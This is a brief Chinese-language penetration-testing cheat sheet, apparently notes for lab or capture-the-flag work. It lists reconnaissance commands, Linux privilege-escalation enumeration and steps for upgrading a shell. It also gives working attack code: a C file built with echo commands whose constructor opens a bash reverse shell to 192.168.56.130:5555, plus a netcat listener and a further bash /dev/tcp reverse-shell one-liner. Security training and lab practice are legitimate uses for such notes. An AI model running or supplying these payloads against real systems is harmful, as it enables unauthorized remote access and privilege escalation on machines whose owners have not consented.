## 信息收集
nmap
gobuster：gobuster dir -u http://target.com -w wordlist.txt
feroxbuster: 
feroxbuster -u http://IP/ --depth=1 -x php,html,txt,zip,bak


## 利用exploit
python开服务器
python3 -m http.server 8000

## 提权流程
### SUID
find / -perm -4000 -type f 2>/dev/null
### sudo权限
sudo -l
### cron
cat /etc/crontab  
ls -la /etc/cron*
### PATH
echo $PATH
### 可写目录
find / -writable -type d 2>/dev/null

ss-tnlp

## 伪终端写文件
```bash
cat << 'EOF' > evil.c
~
EOF

echo '#include <stdlib.h>' > evil.c
echo 'void __attribute__((constructor)) init() {' >> evil.c
echo '    system("bash -c '\''bash -i >& /dev/tcp/192.168.56.130/5555 0>&1'\''");' >> evil.c
echo '}' >> evil.c
```

## 升级shell
```
python -c 'import pty; pty.spawn("/bin/bash")'

script /dev/null -c bash  
export TERM=xterm  
stty sane

rlwrap nc -lvnp 4444
bash -i >& /dev/tcp/你的IP/4444 0>&1
```